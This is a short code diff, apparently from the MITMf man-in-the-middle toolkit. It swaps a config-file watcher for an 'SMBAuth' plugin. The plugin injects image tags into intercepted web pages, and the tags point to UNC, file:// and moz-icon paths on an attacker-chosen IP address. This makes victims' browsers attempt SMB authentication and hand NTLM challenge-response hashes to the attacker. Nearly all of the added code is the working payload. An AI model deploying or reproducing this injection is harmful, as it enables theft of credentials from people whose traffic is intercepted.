@@ -18,24 +18,24 @@
 # USA
 #
 
-from mitmflib.watchdog.observers import Observer
-from mitmflib.watchdog.events import FileSystemEventHandler
-from configobj import ConfigObj
+from plugins.plugin import Plugin
+from plugins.inject import Inject
 
-class ConfigWatcher(FileSystemEventHandler, object):
+class SMBAuth(Inject, Plugin):
+    name     = "SMBAuth"
+    optname  = "smbauth"
+    desc     = "Evoke SMB challenge-response auth attempts"
+    version  = "0.1"
 
-    @property
-    def config(self):
-        return ConfigObj("./config/mitmf.conf")
+    def initialize(self, options):
+        self.ip = options.ip
+        Inject.initialize(self, options)
+        self.html_payload = self._get_data()
 
-    def on_modified(self, event):
-        self.on_config_change()
+    def _get_data(self):
+        return '<img src=\"\\\\%s\\image.jpg\">'\
+                '<img src=\"file://///%s\\image.jpg\">'\
+                '<img src=\"moz-icon:file:///%%5c/%s\\image.jpg\">' % tuple([self.ip]*3)
 
-    def start_config_watch(self):
-        observer = Observer()
-        observer.schedule(self, path='./config', recursive=False)
-        observer.start()
-
-    def on_config_change(self):
-        """ We can subclass this function to do stuff after the config file has been modified"""
+    def options(self, options):
         pass
